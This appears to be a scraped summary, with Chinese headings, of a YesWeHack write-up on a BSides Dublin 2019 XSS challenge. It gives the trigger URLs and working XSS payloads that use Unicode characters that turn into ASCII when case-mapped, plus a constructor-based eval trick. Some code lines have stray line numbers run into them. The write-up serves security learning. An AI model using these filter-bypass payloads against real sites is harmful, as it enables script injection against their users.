# Cracking the Code: Unveiling a Solution for a Peculiar XSS Case | YesWeHack Community
目标站点: bsides2019dublin.h4cktheplanet.com
报告地址: https://www.yeswehack.com/community/solution-for-a-weird-xss-case

## 触发 URL
- https://bsides2019dublin.h4cktheplanet.com/.
- https://bsides2019dublin.h4cktheplanet.com/?name=Hack
- https://bsides2019dublin.h4cktheplanet.com/?name=<K

## 利用方法
关键描述:
- If we find some characters that are not ASCII but become ASCII when transformed to lowercase we should be able to inject some HTML
- We may not be able to inject JavaScript but we can inject some tags
- com/?name=<K id=template>Injectiond</K>d
关键 Payload:
- `Our input look like this: <ı onanimationſtart="alert(1)" style="animation: A"><ſtyle>@keyframes A{}</ſtyle>`
- `<I ONANIMATIONSTART="ALERT(1)" STYLE="ANIMATION: A"><STYLE>@KEYFRAMES A{}</STYLE>`
- `1name=<K id=template><ı onanimationſtart="alert(1)" style="animation: A" ><ſtyle>@keyframes A{}</ſtyle></K>`
- `https://bsides2019dublin.h4cktheplanet.com/?name=<K id=template><ı onanimationſtart=”alert(1)” style=”animation: A” ><ſtyle>@keyframes A{}</ſtyle></K>`
- `1let constructor_str = 'constructor'2let code_to_eval = 'alert(1)'3(X=>X)[constructor](code_to_eval)()`
